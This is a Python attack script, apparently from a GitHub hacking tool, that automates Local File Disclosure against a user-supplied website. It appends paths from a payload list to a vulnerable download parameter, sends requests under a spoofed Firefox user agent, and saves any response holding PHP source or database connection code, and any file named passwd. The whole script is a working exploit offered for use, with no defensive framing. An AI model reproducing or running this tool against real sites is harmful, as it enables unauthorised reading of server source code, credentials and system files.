import requests
import os
from colorama import Fore , init
import sys
init()

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")


def target():
    global site
    site = input(Fore.RED +"""
     _      ______ _____  
    | |    |  ____|  __ \ 
    | |    | |__  | |  | |
    | |    |  __| | |  | |
    | |____| |    | |__| |
    |______|_|    |_____/ 

    github.com/MrH4shtag
    Local File Disclosure Vulnerability

    [#]example: site.com/download.php?file=
    Enter The Target(with http or https): """)


def lfd():
    user_agent ={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0'}

    with open("LFD.txt") as file:
        a = file.read()
        b = a.splitlines()

    for x in b:
        try:
            url = (site+x)
            req = requests.get(url,headers=user_agent, allow_redirects=False)
        

            if req.status_code == 200:

                filename = url.split("/")[-1]
                if ("<?php" or "mysql_connect") in req.text or filename == "passwd":
                    
                    open('result/{}.txt'.format(filename), 'wb').write(req.content)
                    
                    print(Fore.GREEN+"[#] "+url+" Downloaded!!!")
                else:
                    print(Fore.RED+"[#] "+url+" Not Found")
            
            else:
                print(Fore.RED+"[#] "+url+" Not Found")
        except:
            print("Not Found")



if __name__ == "__main__":
    target()
    lfd()
